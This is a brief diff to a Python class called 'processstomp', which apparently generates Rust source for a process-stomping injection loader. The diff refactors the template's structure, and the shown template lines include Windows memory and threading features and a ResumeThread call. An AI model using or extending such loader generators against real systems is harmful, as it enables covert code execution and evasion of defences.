@@ -27,16 +27,11 @@ class processstomp:
     def compilerOptions(self) -> list[str]:
         return ['windows-sys = { version = "0.61.2", features = ["Win32_System_Memory", "Win32_System_Threading", "Win32_Security", "Win32_Foundation", "Win32_System_Diagnostics_Debug", "Win32_System_Kernel", "Wdk_System", "Wdk_System_Threading"] }']
 
+    def codeblocks(self) -> str:
+        return """"""
+
     def template(self) -> str:
         return """
-{imports}
-
-{codeblocks}
-
-
-fn main() {{
-
-    
     {transformers}
 
     unsafe
@@ -139,8 +134,5 @@ fn main() {{
             tmp);
         
         ResumeThread((lpprocessinformation).hThread);
-    
     }}
-    
-}}
 """
